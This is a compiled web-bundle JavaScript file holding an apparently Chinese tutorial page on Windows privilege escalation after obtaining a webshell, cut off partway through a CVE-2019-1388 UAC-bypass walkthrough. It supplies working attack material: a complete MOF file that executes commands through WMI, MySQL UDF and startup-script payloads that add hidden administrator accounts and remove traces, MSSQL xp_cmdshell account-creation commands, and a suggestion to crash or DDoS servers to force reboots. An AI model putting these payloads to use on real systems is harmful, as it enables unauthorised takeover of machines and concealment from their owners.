"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[114],{81021:(s,i)=>{i.A=(s,i)=>{const a=s.__vccOpts||s;for(const[s,e]of i)a[s]=e;return a}},61893:(s,i,a)=>{a.r(i),a.d(i,{comp:()=>C,data:()=>f});var e=a(6254);const n=a.p+"assets/img/image-20241028101212-g9bhpdw.97be2563.png",l=a.p+"assets/img/image-20241028101313-4ybzlfc.cbc67754.png",t=a.p+"assets/img/image-20241028205200-lcjngac.e3d8484e.png",h=a.p+"assets/img/image-20241028205049-t4kupke.089124e0.png",p=a.p+"assets/img/image-20241029161424-rnhdxb1.2f0400cf.png",d=a.p+"assets/img/image-20241028190019-mnf5io1.4524daad.png",k=a.p+"assets/img/image-20241028203653-4qhja01.8ad28580.png",r=a.p+"assets/img/image-20241028203618-7zvsjfd.b8639a5b.png",o=a.p+"assets/img/image-20241028163224-0g0k9d0.6e232a3e.png",g=a.p+"assets/img/image-20241028163145-ffka5v6.29d6da73.png",c=a.p+"assets/img/image-20241028163010-9b24mf4.69682846.png",y=a.p+"assets/img/image-20241028180242-cdz0cxq.3de9de0e.png",m=a.p+"assets/img/image-20241028180317-kzz1yck.0a1356f2.png",A=a.p+"assets/img/image-20241028180400-0xj1496.55c41561.png",u=a.p+"assets/img/image-20241028180429-vr9jnw4.555d60bd.png",b=a.p+"assets/img/image-20241028180529-qfucynm.5e682eed.png",F=a.p+"assets/img/image-20241028180740-hsf4liv.a09e7745.png",v=a.p+"assets/img/image-20241028180451-yh8b4zm.9d01dbb7.png",B=a.p+"assets/img/MSF-bypassuac-20241028182345-0ku71nm.491d521b.png",w={},C=(0,a(81021).A)(w,[["render",function(s,i){return(0,e.uX)(),(0,e.CE)("div",null,i[0]||(i[0]=[(0,e.Fv)('<h4 id="windows提权分类" tabindex="-1"><a class="header-anchor" href="#windows提权分类"><span>windows提权分类</span></a></h4><p>1.系统漏洞提权(Linux、Windows)内核提权<br> 3.第三方软件/服务提权<br> 2.数据库提权<br> 4.系统配置错误提权</p><h4 id="windows提权概述" tabindex="-1"><a class="header-anchor" href="#windows提权概述"><span>windows提权概述</span></a></h4><p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br> windows:</p><p>user--&gt;System<br> user--&gt;Administrator</p><p>Linux:<br> user--&gt;Root</p><h4 id="windows提权流程" tabindex="-1"><a class="header-anchor" href="#windows提权流程"><span>windows提权流程</span></a></h4><p>获得目标机shll=&gt;查看补丁记录=&gt;寻找对应EXP=&gt;使用Exp提权</p><h4 id="_1-windows系统漏洞提权" tabindex="-1"><a class="header-anchor" href="#_1-windows系统漏洞提权"><span>1.windows系统漏洞提权</span></a></h4><ol><li><p>查看这台主机还有哪些漏洞没有修复</p><p>方法一：在cmd中输入systeminfo查看补丁安装情况</p><p>​<img src="'+n+'" alt="image" loading="lazy">​</p><p>方法二：通过命令查询出哪些补丁没有安装</p></li><li><p>查找补丁对应的漏洞号 使用在线查询工具</p><p><a href="http://blog.neargle.com/win-powerup-exp-index/#" target="_blank" rel="noopener noreferrer">http://blog.neargle.com/win-powerup-exp-index/#</a></p><p><a href="http://tools.sbbbb.cn/tiquan/" target="_blank" rel="noopener noreferrer">http://tools.sbbbb.cn/tiquan/</a></p><p><a href="http://bypass.tidesec.com/exp/" target="_blank" rel="noopener noreferrer">http://bypass.tidesec.com/exp/</a></p></li><li><p>查找对应提权exp</p><p>可在搜索引擎查找</p><p>github查找 <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener noreferrer">github.com/SecWiki/windows-kernel-exploits</a></p><p>windows中提权exp的格式为</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p></li><li><p>配合msf进行提权</p></li></ol><h4 id="_2-windows-数据库提权" tabindex="-1"><a class="header-anchor" href="#_2-windows-数据库提权"><span>2.windows 数据库提权</span></a></h4><h5 id="mysql-mof提权步骤" tabindex="-1"><a class="header-anchor" href="#mysql-mof提权步骤"><span>mysql-mof提权步骤</span></a></h5><ol><li><p>在可写目录中上传mof文件</p><p>nullevt.mof 文件</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;)</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> __EventFilter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $EventFilter</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">EventNamespace</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Root</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Cimv2&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;filtP2&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Query</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Select * From __InstanceModificationEvent &quot;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;Where TargetInstance Isa </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Win32_LocalTime</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> &quot;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;And TargetInstance.Second = 5&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">QueryLanguage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;WQL&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ActiveScriptEventConsumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $Consumer</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;consPCSV2&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ScriptingEngine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;JScript&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ScriptText</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;var WSH = new ActiveXObject(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WScript.Shell</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">)\\nWSH.run(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">net.exe user zhang 123456 /add</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> __FilterToConsumerBinding</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Consumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $Consumer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $EventFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>把.mof脚本移动到指定的目录：c:/windows/system32/wbem/mof/目录下，该目录每5秒执行一次<img src="'+t+'" alt="image" loading="lazy">​</p></li><li><p>执行 load file 及 into dumpfile 把文件导出到正确的位置</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> load_file(&#39;c:/phpstudy/www/nullevt.mof&#39;)into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> dumpfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>执行成功后，验证mof文件中的cmd命令是否执行</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p></li><li><p>同样的方法修改mof文件再重复上次的步骤，可以将用户添加到管理员组</p></li></ol><p>‍</p><h5 id="mysql-udf提权" tabindex="-1"><a class="header-anchor" href="#mysql-udf提权"><span>mysql-UDF提权</span></a></h5><h6 id="udf提权原理" tabindex="-1"><a class="header-anchor" href="#udf提权原理"><span>UDF提权原理</span></a></h6><p><span data-type="text" style="color:var(--b3-font-color8);">UDF(User Defined Function)用户自定义函数,支持用户自定义</span></p><p>通过添加新的函数，<span data-type="text" style="color:var(--b3-font-color8);">对mysqI服务器进行功能扩充，从而创建函数，将MYSQL账号转化为系统system权限</span></p><p>UDF提权是通过root权限导出udf.dll到系统目录下，可以<span data-type="text" style="color:var(--b3-font-color8);">通过udf.dll调用执行cmd</span></p><h6 id="利用udf提权条件" tabindex="-1"><a class="header-anchor" href="#利用udf提权条件"><span>利用UDF提权条件</span></a></h6><ol><li><p>Windows 2000、XP、2003</p></li><li><ol start="2"><li>MySQL数据库版本</li></ol></li><li><p>3.账号具有对MySQL的插入和删除权限</p></li><li><p>4.可以将udf.d写入到相应目录的权限</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p></li></ol><h6 id="mysql-udf提权步骤" tabindex="-1"><a class="header-anchor" href="#mysql-udf提权步骤"><span>MySQL-UDF提权步骤</span></a></h6><ol><li><p>收集必要信息</p><p>select version(); select user(); select @@basedir, //获取数据库版本 //获取数据库用户 //获取数据库安装目录</p></li></ol><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><ol start="2"><li><p>MySQL版本高于5.1，创建导出文件夹</p><p>/lib/plugin目录本身是不存在的，可以利用NTFS ADS流来创建文件夹</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;xxx&#39;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;MySQL目录\\\\lib::$INDEX ALLOCATION&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;xxx&#39;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;MySQL目录\\\\lib\\\\plugin::$INDEX ALLOCATION&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以利用webshell直接在mysql安装路径下创建piugin目录</p></li><li><p>导入 udf.dl 文件</p><p>DLL文件的获取方法:</p><p>在 sqlmap/data/udf/mysq!/ 目录下,</p><p>在Windows目录中有32位和64位dll文件(MySQL的位数，文件夹中的dll文件是通过异或编码的，可以使用sqlmap/extra/cloak.py进行解密</p><p>将dll文件上传到mysql的/Iib/plugin目录下</p><p>​<img src="'+k+'" alt="image" loading="lazy">​</p></li><li><p>创建自定义函数</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> function</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> returns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> soname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;udf.dll&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#创建自定义函数  需要创建.dll文件中存在的函数才可以</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> sys_eval(&quot;net</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user youze1 123456 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;);   #创建用户</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">select sys_eval(&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">net localgroup administrators youze1 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;); #提升为管理员权限</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">drop function sys_eval;  #清除痕迹</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">delete from mysql.func where name=&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><h5 id="mysql启动项提权" tabindex="-1"><a class="header-anchor" href="#mysql启动项提权"><span>mysql启动项提权</span></a></h5><h6 id="原理" tabindex="-1"><a class="header-anchor" href="#原理"><span>原理</span></a></h6><p>将一段 VBS脚本导入到<span data-type="text" style="color:var(--b3-font-color8);">开机启动项中</span>，如果管理员重启了服务器，那么就会自动调用该脚本，并执行其中的用户添加 及提权命令</p><h6 id="利用条件" tabindex="-1"><a class="header-anchor" href="#利用条件"><span>利用条件:</span></a></h6><ol><li><p>上传到目录必须具备可读写的权限</p></li><li><p>调用的 cmd 也必须有足够的权限</p></li><li><p>重启服务器可以利用一些可导致服务器蓝屏的EXP，或者DDoS拒绝服务</p></li></ol><h6 id="步骤" tabindex="-1"><a class="header-anchor" href="#步骤"><span>步骤</span></a></h6><ol><li><p>如果可以直接上传到启动项目录就不需要使用数据库</p><p>C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动 目录存在可读写的权限</p></li><li><p>进入test数据库，并创建一个新的表:</p><p>create table a(cmd text) // a表名，字段名cmd，text文本类型</p></li><li><p>在表中插入数据</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;a=wshshell.run(&quot;&quot;cmd.exe /c net user icg 123.com /add&quot;&quot; 0)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;b=wshshell.run(&quot;&quot;cmd.exe /c net localgroup administrators icg /add&quot;&quot;,0)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>输出表为一个 VBS 的脚本文件</p><p>select * from a into dumpfile &quot;C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序启动\\1.vbs&quot;</p></li><li><p>利用其他手段重启电脑</p></li></ol><h5 id="mssql-xp-cmdshell提权" tabindex="-1"><a class="header-anchor" href="#mssql-xp-cmdshell提权"><span>MSSQL xp_cmdshell提权</span></a></h5><ol><li><p>连接数据库之后</p></li><li><p>查看相干信息</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">--查看当前版本:</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> @@</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">--判断当前是否为sa:</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;sysadmin&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">--判断是否有public权限，可以爆破表:</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;public&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">--判断当前用户写文件、读文件的权限:</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;db_owner&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>查看数据库中是否有 xp_cmdshell 扩展存储插件,返回值为 1则说明该数据库中有插件 MSSQL使用xp_cmdshell</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> count</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(*) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.sysobjects </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">where</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> xtype</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;x&#39;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">and</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;xp cmdshell&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>开启xp_cmdshell MSSQL使用xp_cmdshell</p></li><li><p>执行命令创建用户</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;net user youze 123456 /add&#39;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">       -- 添加用户ichungiu,密码123.com </span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">xp_cmdshell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39; net localgroup administrators youze /add&#39;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">       -- 添加ichunqiu到管理员组</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><h2 id="_3-windows-bypass-uac提权" tabindex="-1"><a class="header-anchor" href="#_3-windows-bypass-uac提权"><span>3.windows bypass UAC提权</span></a></h2><h5 id="利用cve-2019-1388实现bypass-uac" tabindex="-1"><a class="header-anchor" href="#利用cve-2019-1388实现bypass-uac"><span>利用CVE-2019-1388实现bypass UAC</span></a></h5><p>原理:</p><p>如果在运行一个可执行文件的时候我们<span data-type="text" style="color:var(--b3-font-color8);">触发了 UAC</span>,在点击「展示证书发行者的详细信息」这个链接之后 可以看到证书里的 Issued by 字段,这个字段对应的值就是 OID。证书会解析 OID 的值,可能显示为超链接，但是 Windows 忘记禁用了 OID 处的超链接，这就给了我们提权的可能</p><p>步骤</p><ol><li><p>查看是否打补丁 systeminfo</p></li><li><p>下载EXP:CVE-2019-1388/HHUPD.EXE 这里是开启http服务上传​</p><p><img src="'+o+'" alt="image" loading="lazy">​</p></li><li><p>将exp下载到目标机中，并以管理员权限打开HHUPD.EXE,点击显示详细信息​</p><p><img src="'+g+'" alt="image" loading="lazy">​</p></li><li><p>点击显示详细信息里的 &quot;显示有关此发布者的证书的信息“</p></li><li><p>将弹出的网页&quot;另存为”，弹出位置不可用窗口后点击确定</p></li><li><p>通过在保存网页的文件资源管理器的地址栏输入“C:\\windows\\system32\\cmd.exe”打开cmd 这样才能继承浏览器的SYSTEM权限​</p><p><img src="'+c+'" alt="image" 